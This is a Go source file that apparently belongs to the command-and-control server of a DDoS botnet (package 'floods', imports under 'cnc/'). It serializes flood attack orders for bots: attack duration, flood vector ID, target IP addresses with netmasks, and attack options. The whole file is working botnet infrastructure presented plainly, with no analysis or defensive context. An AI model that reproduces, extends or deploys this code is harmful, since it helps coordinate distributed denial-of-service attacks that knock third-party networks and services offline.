package floods

import (
	"cnc/internal/clients/packet"
	"cnc/pkg/logging"
)

// Build will build a packet to send
func (a *AttackProfile) Build() (*packet.Packet, error) {
	pkt := packet.New()

	// insert duration
	pkt.AddUint32(a.Duration)

	// insert flood id
	pkt.AddUint8(a.ID)

	// insert amount of targets
	if a.Targets != nil {
		pkt.AddUint8(uint8(len(a.Targets)))

		// insert targets, yippee
		for target, netmask := range a.Targets {
			pkt.AddUint32(target)
			pkt.AddUint8(netmask)
		}
	}

	// insert amount of options
	pkt.AddUint8(uint8(a.OptionsCount()))

	// insert options, yippee
	for flag, literal := range a.Options {
		if flag.Options.Clientside {
			continue
		}

		pkt.AddUint8(flag.ID)

		if err := flag.Type.Write(literal, pkt, flag); err != nil {
			return nil, err
		}
	}

	logging.Global.Debug().
		Uint16("atk_id", a.AtkId).
		Uint8("vector_id", a.ID).
		Msg("Built attack pkt")

	return pkt, nil
}

// OptionsCount gets the flag count excluding the clientside flags
func (a *AttackProfile) OptionsCount() (c int) {
	for opt, _ := range a.Options {
		if !opt.Options.Clientside {
			c++
		}
	}

	return c
}

func (a *AttackProfile) Option(name string) (data string, ok bool) {
	flag, exists := FlagList[name]
	if !exists {
		return "", false
	}

	data, ok = a.Options[flag]
	return
}
